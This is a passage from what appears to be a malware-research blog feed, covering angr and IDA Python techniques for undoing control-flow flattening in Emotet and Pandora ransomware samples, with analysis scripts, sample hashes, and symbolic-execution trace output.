indicated an obb # The false indicates more dispatcher # We are going to check which next bb matches the # true contidion for the jz true_bb_address = get_operand_value(bb_end,0) for next_bb_flowchart in bb_flowchart.succs(): # Get the next bb address next_bb_start = next_bb_flowchart.start_ea # If we have already visited it ignore if next_bb_start in bb_visited: continue if next_bb_start == true_bb_address: # Put next bb onto the queue q.put(next_bb_flowchart) # Mark the bb as an obb bb_states[next_bb_start] = {&#39;obb&#39;:True} else: # This is another dispatcher bb # Put next bb onto the queue q.put(next_bb_flowchart) # Mark the bb as an obb bb_states[next_bb_start] = {&#39;obb&#39;:False} elif not bb_info.get(&#39;obb&#39;) and print_insn_mnem(bb_end) == &#39;jnz&#39;: # The true jmp indicated an obb # The false indicates more dispatcher # We are going to check which next bb matches the # true contidion for the jz true_bb_address = get_operand_value(bb_end,0) for next_bb_flowchart in bb_flowchart.succs(): # Get the next bb address next_bb_start = next_bb_flowchart.start_ea # If we have already visited it ignore if next_bb_start in bb_visited: continue if next_bb_start == true_bb_address: # Put next bb onto the queue q.put(next_bb_flowchart) # Mark the bb as an obb bb_states[next_bb_start] = {&#39;obb&#39;:False} else: # This is another dispatcher bb # Put next bb onto the queue q.put(next_bb_flowchart) # Mark the bb as an obb bb_states[next_bb_start] = {&#39;obb&#39;:True} else: # We can treat all next bb as if there is no condition # and propogate the bb type for next_bb_flowchart in bb_flowchart.succs(): # Get the next bb address next_bb_start = next_bb_flowchart.start_ea # If we have already visited it ignore if next_bb_start in bb_visited: continue # Add it to the queue and add info same as current block q.put(next_bb_flowchart) # Set bb type based on this bb bb_states[next_bb_flowchart.start_ea] = {&#39;obb&#39;:bb_info.get(&#39;obb&#39;)} else: # No condition next_bb_flowchart = list(bb_flowchart.succs())[0] # If not visited if next_bb_flowchart.start_ea not in bb_visited: # Push next block on queue and add info q.put(next_bb_flowchart) # Set bb type based on this bb bb_states[next_bb_flowchart.start_ea] = {&#39;obb&#39;:bb_info.get(&#39;obb&#39;)} #### ALL this for debugging # Add color to bb just for debugging def set_bb_color(ea, flowchart, color_value): for block in flowchart: if block.start_ea &lt;= ea and block.end_ea &gt; ea: # Loop and add color ptr = block.start_ea while ptr &lt;= prev_head(block.end_ea): set_color(ptr, CIC_ITEM, color_value) ptr = next_head(ptr) break # Verification conditions: # - all bb should be in the visited set # - each bb should have a type associated with it in the bb_states for bb_addr in bb_states: print(f&quot;{hex(bb_addr)}: {bb_states[bb_addr]}&quot;) if bb_states[bb_addr].get(&#39;obb&#39;): # Make green for obb set_bb_color(bb_addr, flowchart, 0x00ff00) else: # Make orange for dispatcher set_bb_color(bb_addr, flowchart, 0x00A5ff) . Deobfuscation With Symboic Execution . Once we have identified the cf and obb blocks we can start using the familliar symbolic execution approach we used for Pandora Ransomware CFF. . TODO.... . Approach For Identifying Original Basic Blocks (OBB) Using Symbolic Execution . The drawback of the assembly approach is that the analyst must first identify what condition causes a transition between the obb and cf blocks. This is a manual process. If we want to fully automate this in a generic way we need to use symbolic execution to identify which bb are cf and which are obb. . For this approach the analyst must still identify how the state is tracked (register) but heuristics can also be used to do this automatically. Once we identify the state we can use the same algorithm above but instead of using a jz/jnz assembly compare to test for a transition between a cf and obb block we can check our symbolic exeuction predicate to see if the state is an equation or a constant (ie. does the state change in the bb or is it constant) if it is constant than we know the state was not modified so this is a cf block if the state can change then this is obb. We must also track if the state has changed and how it was changed to determine if the bb has transitioned from a cf to an obb. . Glossary . cf - control flow | bb - basic block | obb - original basic block (these are from before the obfuscation) | cf bb - control flow basic block also known as part of the dispatcher or &quot;obfuscation code&quot; | symbolic execution - a process of transforming bb assembly code into mathematical/logical equations that can be solved | concolic execution - a mix of symbolic and real (emulation) excution ie. we sub in some concrete values to constrain the exectuion path where they exist in the code | BFS - breadth first search | . The Algorithm . assumption we don&#39;t want to use concolic execution, we just want symbolic execution because we want to trace every branch and we don&#39;t want a concrete STATE value we want a symbol (I think???) . on the entry to each bb reset to the STATE to be a symbol (I think this will force symboic execution) | for each bb step we check the following is the predicate an equation or a constant (ie. does it depend on the STATE). If it depends on the STATE then it must be a CF bb. | if it&#39;s a constant or the predicate an equation does NOT depend on the STATE then it must be the same type of bb as the previous one | check the STATE symbol, if it has been assigned a constant or an equation then this is a obb (if it&#39;s not undefined) | maintain a rolling label (cf/obb) for the bb as you step, propogate the label to each sequential bb until one of the above conditions is met | for each branch (new angr state) push this onto a queue and use a bfs approach | stop execution when we reach a labeled bb | . | . # # # BUGS!! # # This is a work in progress, we have atleast two bugs that cascate to create a bad graph # 1) we need to fix the logic so we correctly identify the first cf bb # 2) we need to figure out why angr chooses such weird bb breaks, like why break at random spots??? # ############################################################################################## import angr, claripy from queue import Queue import struct import logging logging.getLogger(&#39;angr&#39;).setLevel(&#39;ERROR&#39;) BINARY_PATH = &#39;/tmp/emotet.bin&#39; # Save some info about each bb # bb_states[bb_address] = {&quot;is_obb&quot;:true/false} bb_states = {} bb_visited = set() fn_start = 0x10008784 fn_end = 0x100099D2 dispatcher_start = 0x1000953A project = angr.Project(BINARY_PATH, load_options={&#39;auto_load_libs&#39;: False}) # TODO: We should explicately add the state since we know it (main) initial_state = project.factory.call_state(addr=fn_start) # Use this setting to skip calls instead of a hook initial_state.options.add(angr.options.CALLLESS) # Setup simulation manager simgr = project.factory.simgr(initial_state) # We are going to start with an assumption that the first BB is in an obb # Since we are using a queue we need to track this rolling state along with the address of the bb # bb_info = {address:&lt;&gt;, prev_is_obb:true/false} # Use a queue for BFS q = Queue() # Push function start onto queue bb_info = {&#39;address&#39;:fn_start, &#39;prev_is_obb&#39;:True} q.put(bb_info) ## TODO: currently we don&#39;t handle when the first bb in a transition from a cf to obb doesn&#39;t set the STATE, # our algorithm will think this is just another cf bb # Walk the queue while not q.empty(): bb_info = q.get() bb_address = bb_info.get(&#39;address&#39;) prev_bb_is_obb = bb_info.get(&#39;prev_is_obb&#39;) print(f&quot;BB: {hex(bb_address)}&quot;) #print(project.factory.block(simgr.active[0].addr).pp()) # Set the sim manager for the next state to remove any concrete value new_state = project.factory.blank_state(addr=bb_address) new_state.options.add(angr.options.CALLLESS) # Use successors to determine info about this block if len(list(project.factory.successors(new_state))) == 0: # If there are no successors this is an end bb so it must be an obb bb_states[bb_address] = {&#39;is_obb&#39;:True} elif len(list(project.factory.successors(new_state))) == 1: # If there is only next bb then there is no condition if prev_bb_is_obb: # If we are in an obb keep the obb label bb_states[bb_address] = {&#39;is_obb&#39;:True} else: # If we are in an cf we need to test to see if we changed the STATE # this will move us into an obb next_bb = project.factory.successors(new_state)[0] if next_bb.regs.ebx.uninitialized: bb_states[bb_address] = {&#39;is_obb&#39;:False} prev_bb_is_obb = False else: bb_states[bb_address] = {&#39;is_obb&#39;:True} else: # If there are multiple next bb then there is a condition # Determin if the branch depends on state flag_depends_on_state = False for next_bb in project.factory.successors(new_state): for constraint in next_bb.solver.constraints: for v in constraint.variables: if &#39;reg_ebx&#39; in v: flag_depends_on_state = True # If the branch depends on state then this is a cf block if flag_depends_on_state: bb_states[bb_address] = {&#39;is_obb&#39;:False} prev_bb_is_obb = False else: bb_states[bb_address] = {&#39;is_obb&#39;:True} # Mark this bb as visited bb_visited.add(bb_address) # Use successors to push next bb on queue for next_bb in project.factory.successors(new_state): next_address = next_bb.addr if next_address not in bb_visited: bb_info = {&#39;address&#39;:next_address, &#39;prev_is_obb&#39;:prev_bb_is_obb} q.put(bb_info) print(&quot;========================&quot;) print(&quot;DONE!&quot;) . BB: 0x10008784 ======================== BB: 0x10008914 ======================== BB: 0x10008aa1 ======================== BB: 0x10008c31 ======================== BB: 0x10008dbb ======================== BB: 0x10008f47 ======================== BB: 0x100090d0 ======================== BB: 0x1000925d ======================== BB: 0x100093e6 ======================== BB: 0x10009555 ======================== BB: 0x10009894 ======================== BB: 0x10009863 ======================== BB: 0x1000955b ======================== BB: 0x100099c1 ======================== BB: 0x100098a0 ======================== BB: 0x1000988a ======================== BB: 0x100097cd ======================== BB: 0x10009563 ======================== BB: 0x10009549 ======================== BB: 0x100098e8 ======================== BB: 0x100098a4 ======================== BB: 0x1000953a ======================== BB: 0x100097e6 ======================== BB: 0x10009713 ======================== BB: 0x1000956f ======================== BB: 0x10009904 ======================== BB: 0x100098ac ======================== BB: 0x100099c6 ======================== BB: 0x10009830 ======================== BB: 0x10009732 ======================== BB: 0x100095a9 ======================== BB: 0x10009573 ======================== BB: 0x1000998c ======================== BB: 0x100098d8 ======================== BB: 0x100099d2 ======================== BB: 0x1000985b ======================== BB: 0x10009750 ======================== BB: 0x100095c2 ======================== BB: 0x1000957b ======================== BB: 0x10009998 ======================== BB: 0x1000999f ======================== BB: 0x100098db ======================== BB: 0x100096fa ======================== BB: 0x1000977e ======================== BB: 0x100095e3 ======================== BB: 0x10009595 ======================== BB: 0x100099a4 ======================== BB: 0x100099ba ======================== BB: 0x100097af ======================== BB: 0x10009615 ======================== BB: 0x100099ba ======================== BB: 0x100097c5 ======================== BB: 0x100096a2 ======================== BB: 0x100096f5 ======================== BB: 0x100096d6 ======================== BB: 0x100096f2 ======================== DONE! . bb_states . {268470148: {&#39;is_obb&#39;: True}, 268470548: {&#39;is_obb&#39;: True}, 268470945: {&#39;is_obb&#39;: True}, 268471345: {&#39;is_obb&#39;: True}, 268471739: {&#39;is_obb&#39;: True}, 268472135: {&#39;is_obb&#39;: True}, 268472528: {&#39;is_obb&#39;: True}, 268472925: {&#39;is_obb&#39;: True}, 268473318: {&#39;is_obb&#39;: False}, 268473685: {&#39;is_obb&#39;: True}, 268474516: {&#39;is_obb&#39;: False}, 268474467: {&#39;is_obb&#39;: False}, 268473691: {&#39;is_obb&#39;: False}, 268474817: {&#39;is_obb&#39;: True}, 268474528: {&#39;is_obb&#39;: False}, 268474506: {&#39;is_obb&#39;: False}, 268474317: {&#39;is_obb&#39;: False}, 268473699: {&#39;is_obb&#39;: False}, 268473673: {&#39;is_obb&#39;: False}, 268474600: {&#39;is_obb&#39;: False}, 268474532: {&#39;is_obb&#39;: False}, 268473658: {&#39;is_obb&#39;: False}, 268474342: {&#39;is_obb&#39;: False}, 268474131: {&#39;is_obb&#39;: False}, 268473711: {&#39;is_obb&#39;: False}, 268474628: {&#39;is_obb&#39;: False}, 268474540: {&#39;is_obb&#39;: False}, 268474822: {&#39;is_obb&#39;: False}, 268474416: {&#39;is_obb&#39;: True}, 268474162: {&#39;is_obb&#39;: False}, 268473769: {&#39;is_obb&#39;: False}, 268473715: {&#39;is_obb&#39;: False}, 268474764: {&#39;is_obb&#39;: True}, 268474584: {&#39;is_obb&#39;: True}, 268474834: {&#39;is_obb&#39;: False}, 268474459: {&#39;is_obb&#39;: False}, 268474192: {&#39;is_obb&#39;: False}, 268473794: {&#39;is_obb&#39;: False}, 268473723: {&#39;is_obb&#39;: False}, 268474776: {&#39;is_obb&#39;: False}, 268474783: {&#39;is_obb&#39;: True}, 268474587: {&#39;is_obb&#39;: True}, 268474106: {&#39;is_obb&#39;: False}, 268474238: {&#39;is_obb&#39;: True}, 268473827: {&#39;is_obb&#39;: False}, 268473749: {&#39;is_obb&#39;: True}, 268474788: {&#39;is_obb&#39;: False}, 268474810: {&#39;is_obb&#39;: False}, 268474287: {&#39;is_obb&#39;: False}, 268473877: {&#39;is_obb&#39;: False}, 268474309: {&#39;is_obb&#39;: False}, 268474018: {&#39;is_obb&#39;: True}, 268474101: {&#39;is_obb&#39;: False}, 268474070: {&#39;is_obb&#39;: False}, 268474098: {&#39;is_obb&#39;: False}} .",
            "url": "https://research.openanalysis.net/emotet/malware/angr/symbolic%20execution/deobfuscation/research/2022/04/06/emotet_deobfuscation.html",
            "relUrl": "/emotet/malware/angr/symbolic%20execution/deobfuscation/research/2022/04/06/emotet_deobfuscation.html",
            "date": " • Apr 6, 2022"
        }
        
    
  
    
        ,"post15": {
            "title": "Angr Control Flow Deobfuscation",
            "content": "Overview . Today we are going to learn a bit about how to use angr for control flow deobfuscation. We are using the Pandora Ransomware sample as an example. . Sample (packed) . 5b56c5d86347e164c6e571c86dbf5b1535eae6b979fede6ed66b01e79ea33b7b . Unpacked sample (we will be using this as our example) . 2619862c382d3e375f13f3859c6ab44db1a4bce905b4a617df2390fbf36902e7 . The Concept . We have a binary that has been obfuscated using control flow flattening (CFF). The original control flow (CF) of each function has been replaced by a state machine. Each of the original code basic blocks (BB) has been given a state. To transition between the basic blocks a dispatcher is used which routes the control flow based on the current state. . Before CFF . After CFF . Removing CFF . The theory behind removing CFF is to identify the state of each original BB, and the &quot;next&quot; state(s) that each original BB along with the condition that sets each of these states. . Basic Block State The BB state can be thought of as -- what state must be put INTO the dispatcher to route to the BB. . Next State The &quot;next&quot; state depends on whether the BB has conditional control flow. If there is no condition then there will only be ONE next state. However, if there is conditional control flow there will be TWO next states with a dependency on some condition within the BB. . In practice determining theses states and next states can be difficult as the dispatcher may be complex and the conditions used to set the next state may also be complex. . Initial Analysis . Before we can begin analyzing the CFF state machine we need to extract the following initial information from the function. . The function entrypoint (this is assumed) | The address of the DISPATCHER start It may be possible to determine this heuristically as many bb will jmp to this address | . | The STATE variable The STATE variable is the variable used to pass the STATE to the DISPATCHER. In simple CFF cases the same variable is used throughout the original code blocks but in more complex CFF this cannot be relied on. | . | The address of each of the original code basic blocks This may not be needed initially depending on the strategy. It maybe be possible to recover these during symbolic execution. | . | . An Emulation Approach (For Comparison) . To associate a state with each original code block we can first collect a list of states using some simple assembly pattern matching in the original code blocks (the state will be moved to EAX). Then start emulation at the dispatcher start and run an emulation for each state stopping on the first jmp to an original code block -- this is the state for that block. Then once we have the states associate with each block we can manually connect up the original basic blocks and remove the dispatcher. . This approach has many drawbacks, but the main issues are finding the states using pattern matching. Depending on how the states are set it may not be as simple as collecting all of the states by looking for a mov eax, immediate. Also, once the states are assigned to the basic blocks determining what conditions trigger which next state for each bb may also prove complex and very brittle (less re-usable code) . A Symbolic Execution Approach . With symbolic execution we are not limited to the constraints of the variables, but can &quot;symbolically execute&quot; over all possible paths between the dispatcher and the original basic blocks. This allows us to test all possible options for the STATE variable. T . Associating A STATE With Each Original Basic Block . The first step is to associate a STATE with a an original basic block (OBB). We have an advantage with the state machine in that we know the initial state (it muste either be set in the entrpoint or passed into the funcation as an argument). Once we know the initial state we can use this to execute until we reach an OBB. We can now associated this state with the OBB . Determining Next STATE(S) . Once we have reached the start of an OBB we can symbolically execute until we reach the dispatcher again. Once we reach the dispatcher we can query the symbolic equation for possible value(s) of the STATE. There may be multiple values depending on the conditional logic in the OBB. These STATE values are the next states and will allow us to further interrogate the function to associated with with more OBBs. . CFF State Machine Parsing Algorithm . The full algorithm for parsing the CFF state machine is described below. . Use initial STATE and execute from the start of the DISPATCHER until reaching an OBB | Assocated this STATE with the OBB | Continue executing until reaching the DISPATCHER | Solve the symbolic equation for the STATE(S) to determine the NEXT-STATE(s) of the OBB | Associate these NEXT-STATE(s) with the OBB (STATE -&gt; OBB -&gt; NEXT-STATE) | Repeate the process for each NEXT-STATE treatin each one as the new STATE | . References . angr docs | angr cheat sheet | z3 | OST2 - Reverse Engineering 3201: Symbolic Analysis | Unpacked Pandora sample 2619862c382d3e375f13f3859c6ab44db1a4bce905b4a617df2390fbf36902e7 | Control Flow Flattening | Deobfuscation - Recovering an ollvm | stadeo deobfuscation tool | Control Flow Unflattening | Analysis of Virtualization-based Obfuscation (r2con2021workshop) | . Complete Solution from @mrexodia . In this approach less initial information is needed about the binary. Also this approach will work on the un-patched binary (something I didn&#39;t realize was possible with angre). One of the advantage of Angr is that it is able to read and interact with the hard-coded jmp table without additional hooks/patches. . All creadit for this method goes to mrexodia who developed the original code and proof of concept for this approach. . import angr proj = angr.Project(&quot;/tmp/pandora_dump_SCY.bin&quot;, load_options={&#39;auto_load_libs&#39;: False}) def get_dispatcher_state(function, dispatcher): state = proj.factory.call_state(addr=function) # Ignore function calls # https://github.com/angr/angr/issues/723 state.options.add(angr.options.CALLLESS) simgr = proj.factory.simulation_manager(state) # Find the dispatcher while True: simgr.step() assert len(simgr.active) == 1 state = simgr.active[0] if state.addr == dispatcher: return state.copy() addr_main = 0x7FF6C4B066F0 addr_dispatcher = 0x7ff6c4b067f0 dispatcher_state = get_dispatcher_state(function=addr_main, dispatcher=addr_dispatcher) print(f&quot;Dispatcher state: {dispatcher_state}&quot;) initial_state = dispatcher_state.solver.eval_one(dispatcher_state.regs.eax) print(f&quot;Initial eax: {hex(initial_state)}&quot;) . WARNING | 2022-03-31 15:04:33,126 | angr.calling_conventions | Guessing call prototype. Please specify prototype. WARNING | 2022-03-31 15:04:33,138 | angr.storage.memory_mixins.default_filler_mixin | The program is accessing register with an unspecified value. This could indicate unwanted behavior. WARNING | 2022-03-31 15:04:33,139 | angr.storage.memory_mixins.default_filler_mixin | angr will cope with this by generating an unconstrained symbolic variable and continuing. You can resolve this by: WARNING | 2022-03-31 15:04:33,139 | angr.storage.memory_mixins.default_filler_mixin | 1) setting a value to the initial state WARNING | 2022-03-31 15:04:33,140 | angr.storage.memory_mixins.default_filler_mixin | 2) adding the state option ZERO_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to make unknown regions hold null WARNING | 2022-03-31 15:04:33,141 | angr.storage.memory_mixins.default_filler_mixin | 3) adding the state option SYMBOL_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to suppress these messages. WARNING | 2022-03-31 15:04:33,141 | angr.storage.memory_mixins.default_filler_mixin | Filling register r15 with 8 unconstrained bytes referenced from 0x7ff6c4b066f0 (offset 0x66f0 in pandora_dump_SCY.bin (0x7ff6c4b066f0)) WARNING | 2022-03-31 15:04:33,143 | angr.storage.memory_mixins.default_filler_mixin | Filling register r14 with 8 unconstrained bytes referenced from 0x7ff6c4b066f2 (offset 0x66f2 in pandora_dump_SCY.bin (0x7ff6c4b066f2)) WARNING | 2022-03-31 15:04:33,144 | angr.storage.memory_mixins.default_filler_mixin | Filling register r13 with 8 unconstrained bytes referenced from 0x7ff6c4b066f4 (offset 0x66f4 in pandora_dump_SCY.bin (0x7ff6c4b066f4)) WARNING | 2022-03-31 15:04:33,146 | angr.storage.memory_mixins.default_filler_mixin | Filling register r12 with 8 unconstrained bytes referenced from 0x7ff6c4b066f6 (offset 0x66f6 in pandora_dump_SCY.bin (0x7ff6c4b066f6)) WARNING | 2022-03-31 15:04:33,147 | angr.storage.memory_mixins.default_filler_mixin | Filling register rsi with 8 unconstrained bytes referenced from 0x7ff6c4b066f8 (offset 0x66f8 in pandora_dump_SCY.bin (0x7ff6c4b066f8)) WARNING | 2022-03-31 15:04:33,149 | angr.storage.memory_mixins.default_filler_mixin | Filling register rdi with 8 unconstrained bytes referenced from 0x7ff6c4b066f9 (offset 0x66f9 in pandora_dump_SCY.bin (0x7ff6c4b066f9)) WARNING | 2022-03-31 15:04:33,150 | angr.storage.memory_mixins.default_filler_mixin | Filling register rbp with 8 unconstrained bytes referenced from 0x7ff6c4b066fa (offset 0x66fa in pandora_dump_SCY.bin (0x7ff6c4b066fa)) WARNING | 2022-03-31 15:04:33,152 | angr.storage.memory_mixins.default_filler_mixin | Filling register rbx with 8 unconstrained bytes referenced from 0x7ff6c4b066fb (offset 0x66fb in pandora_dump_SCY.bin (0x7ff6c4b066fb)) . Dispatcher state: &lt;SimState @ 0x7ff6c4b067f0&gt; Initial eax: 0x8cbc0434 . # %% def find_successors(state_value, dispatcher): state = dispatcher_state.copy() state.regs.eax = state.solver.BVV(state_value, 32) simgr = proj.factory.simulation_manager(state) while True: print(f&quot;eax: {simgr.active[0].regs.eax}&quot;) print(f&quot;Stepping: {simgr.active} ...&quot;) simgr.step() # TODO: the block before the dispatcher is wrong, we need the first non-dispatcher block if len(simgr.active) == 0: return state, [] assert len(simgr.active) == 1 state2 = simgr.active[0] print(f&quot; Only found a single sucessor: {hex(state2.addr)}&quot;) if state2.addr == dispatcher: print(f&quot; Dispatcher, eax: {state2.regs.eax}&quot;) # TODO: figure out where these potential values are set solutions = state2.solver.eval_upto(state2.regs.eax, 2) # TODO: might need more potential states return state, solutions elif state2.addr == 0x7ff6c4b070ea: # HACK: int3 here, no idea how to properly handle it return state, [] state = state2 . from queue import Queue # state_value =&gt; real basic block state states = {} q = Queue() q.put(initial_state) while not q.empty(): state_value = q.get() # Skip visited states if state_value in states: continue bb_state, successors = find_successors(state_value, addr_dispatcher) print(f&quot;{hex(state_value)} {bb_state} =&gt; {[hex(n) for n in successors]}&quot;) print() states[state_value] = bb_state, successors for state_value in successors: q.put(state_value) dot = &quot;digraph CFG { n&quot; for state_value in states.keys(): _, succ = states[state_value] for s in succ: dot += f&quot; &quot;{hex(state_value)} &quot; -&gt; &quot;{hex(s)} &quot; n&quot; dot += &quot;}&quot; print(dot) . WARNING | 2022-03-31 15:04:33,342 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeffa8 with 4 unconstrained bytes referenced from 0x7ff6c4b06da8 (offset 0x6da8 in pandora_dump_SCY.bin (0x7ff6c4b06da8)) . eax: &lt;BV32 0x8cbc0434&gt; Stepping: [&lt;SimState @ 0x7ff6c4b067f0&gt;] ... Only found a single sucessor: 0x7ff6c4b06819 eax: &lt;BV32 0x8cbc0434&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06819&gt;] ... Only found a single sucessor: 0x7ff6c4b06830 eax: &lt;BV32 0x8cbc0434&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06830&gt;] ... Only found a single sucessor: 0x7ff6c4b06847 eax: &lt;BV32 0x8cbc0434&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06847&gt;] ... Only found a single sucessor: 0x7ff6c4b06863 eax: &lt;BV32 0x8cbc0434&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06863&gt;] ... Only found a single sucessor: 0x7ff6c4b0687f eax: &lt;BV32 0x8cbc0434&gt; Stepping: [&lt;SimState @ 0x7ff6c4b0687f&gt;] ... Only found a single sucessor: 0x7ff6c4b067f0 Dispatcher, eax: &lt;BV32 if fake_ret_value_10_64{UNINITIALIZED} == 0x0 then 0x173ba5e1 else 0x7d9d86f3&gt; 0x8cbc0434 &lt;SimState @ 0x7ff6c4b0687f&gt; =&gt; [&#39;0x7d9d86f3&#39;, &#39;0x173ba5e1&#39;] eax: &lt;BV32 0x7d9d86f3&gt; Stepping: [&lt;SimState @ 0x7ff6c4b067f0&gt;] ... Only found a single sucessor: 0x7ff6c4b068b0 eax: &lt;BV32 0x7d9d86f3&gt; Stepping: [&lt;SimState @ 0x7ff6c4b068b0&gt;] ... Only found a single sucessor: 0x7ff6c4b06a30 eax: &lt;BV32 0x7d9d86f3&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06a30&gt;] ... Only found a single sucessor: 0x7ff6c4b06bbb eax: &lt;BV32 0x7d9d86f3&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06bbb&gt;] ... Only found a single sucessor: 0x7ff6c4b067c8 eax: &lt;BV32 0x7d9d86f3&gt; Stepping: [&lt;SimState @ 0x7ff6c4b067c8&gt;] ... Only found a single sucessor: 0x7ff6c4b070d1 eax: &lt;BV32 0x7d9d86f3&gt; Stepping: [&lt;SimState @ 0x7ff6c4b070d1&gt;] ... Only found a single sucessor: 0x7ff6c4b070ea 0x7d9d86f3 &lt;SimState @ 0x7ff6c4b070d1&gt; =&gt; [] eax: &lt;BV32 0x173ba5e1&gt; Stepping: [&lt;SimState @ 0x7ff6c4b067f0&gt;] ... Only found a single sucessor: 0x7ff6c4b068b0 eax: &lt;BV32 0x173ba5e1&gt; Stepping: [&lt;SimState @ 0x7ff6c4b068b0&gt;] ... Only found a single sucessor: 0x7ff6c4b068c7 eax: &lt;BV32 0x173ba5e1&gt; Stepping: [&lt;SimState @ 0x7ff6c4b068c7&gt;] ... Only found a single sucessor: 0x7ff6c4b068e3 eax: &lt;BV32 0x173ba5e1&gt; Stepping: [&lt;SimState @ 0x7ff6c4b068e3&gt;] ... Only found a single sucessor: 0x7ff6c4b06ce1 eax: &lt;BV32 0x173ba5e1&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06ce1&gt;] ... Only found a single sucessor: 0x7ff6c4b06cfd eax: &lt;BV32 0x173ba5e1&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06cfd&gt;] ... Only found a single sucessor: 0x7ff6c4b06d2e eax: &lt;BV32 fake_ret_value_12_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06d2e&gt;] ... Only found a single sucessor: 0x7ff6c4b06d54 eax: &lt;BV32 fake_ret_value_13_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06d54&gt;] ... Only found a single sucessor: 0x7ff6c4b06d67 eax: &lt;BV32 fake_ret_value_14_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06d67&gt;] ... Only found a single sucessor: 0x7ff6c4b06d7a eax: &lt;BV32 fake_ret_value_15_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06d7a&gt;] ... Only found a single sucessor: 0x7ff6c4b06d95 eax: &lt;BV32 fake_ret_value_16_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06d95&gt;] ... Only found a single sucessor: 0x7ff6c4b06da8 eax: &lt;BV32 fake_ret_value_17_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06da8&gt;] ... Only found a single sucessor: 0x7ff6c4b06dd5 eax: &lt;BV32 fake_ret_value_19_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06dd5&gt;] ... Only found a single sucessor: 0x7ff6c4b06df2 eax: &lt;BV32 fake_ret_value_20_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06df2&gt;] ... Only found a single sucessor: 0x7ff6c4b06e05 eax: &lt;BV32 fake_ret_value_21_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06e05&gt;] ... Only found a single sucessor: 0x7ff6c4b06e20 eax: &lt;BV32 fake_ret_value_22_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06e20&gt;] ... Only found a single sucessor: 0x7ff6c4b06e33 eax: &lt;BV32 fake_ret_value_23_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06e33&gt;] ... Only found a single sucessor: 0x7ff6c4b06e57 eax: &lt;BV32 fake_ret_value_24_64{UNINITIALIZED}[31:0]&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06e57&gt;] ... Only found a single sucessor: 0x7ff6c4b067f0 Dispatcher, eax: &lt;BV32 0x7a980236&gt; 0x173ba5e1 &lt;SimState @ 0x7ff6c4b06e57&gt; =&gt; [&#39;0x7a980236&#39;] eax: &lt;BV32 0x7a980236&gt; Stepping: [&lt;SimState @ 0x7ff6c4b067f0&gt;] ... Only found a single sucessor: 0x7ff6c4b068b0 eax: &lt;BV32 0x7a980236&gt; Stepping: [&lt;SimState @ 0x7ff6c4b068b0&gt;] ... Only found a single sucessor: 0x7ff6c4b06a30 eax: &lt;BV32 0x7a980236&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06a30&gt;] ... Only found a single sucessor: 0x7ff6c4b06a4c eax: &lt;BV32 0x7a980236&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06a4c&gt;] ... Only found a single sucessor: 0x7ff6c4b06edc eax: &lt;BV32 0x7a980236&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06edc&gt;] ... . WARNING | 2022-03-31 15:04:33,420 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff60 with 8 unconstrained bytes referenced from 0x7ff6c4b06ef8 (offset 0x6ef8 in pandora_dump_SCY.bin (0x7ff6c4b06ef8)) WARNING | 2022-03-31 15:04:33,489 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff50 with 8 unconstrained bytes referenced from 0x7ff6c4b0694d (offset 0x694d in pandora_dump_SCY.bin (0x7ff6c4b0694d)) WARNING | 2022-03-31 15:04:33,491 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff40 with 8 unconstrained bytes referenced from 0x7ff6c4b06952 (offset 0x6952 in pandora_dump_SCY.bin (0x7ff6c4b06952)) . Only found a single sucessor: 0x7ff6c4b06ef8 eax: &lt;BV32 0x7a980236&gt; Stepping: [&lt;SimState @ 0x7ff6c4b06ef8&gt;] ... Only found a single sucessor: 0x7ff6c4b067f0 Dispatcher, eax: &lt;BV32 if 0x1 &lt;= mem_7fffffffffeff60_25_64{UNINITIALIZED} then 0xa22a16af else 0x10bc6c78&gt; 0x7a980236 &lt;SimState @ 0x7ff6c4b06ef8&gt; =&gt; [&#39;0x10bc6c78&#39;, &#39;0xa22a16af&#39;] eax: &lt;BV32 0x10bc6c78&gt; Stepping: [&lt;SimState @ 0x7ff6c4b067f0&gt;] ... Only found a single sucessor: 0x7ff6c4b068b0 eax: &lt;BV32 0x10bc6c78&gt; Stepping: [&lt;SimState @ 0x7ff6c4b068b0&gt;] ... Only found a single sucessor: 0x7ff6c4b068c7 eax: &lt;BV32 0x10bc6c78&gt; Stepping: [&lt;SimState @ 0x7ff6c4b068c7&gt;] ... Only found a single sucessor: 0x7ff6c4b068e3 eax: &lt;BV32 0x10bc6c78&gt; Stepping: [&lt;SimState @ 0x7ff6c4b068e3&gt;] ... Only found a single sucessor: 0x7ff6c4b068ff eax: &lt;BV32 0x10bc6c78&gt; Stepping: [&lt;SimState @ 0x7ff6c4b068ff&gt;] ... Only found a single sucessor: 0x7ff6c4b0691a eax: &lt;BV32 0x10bc6c78&gt; Stepping: [&lt;SimState 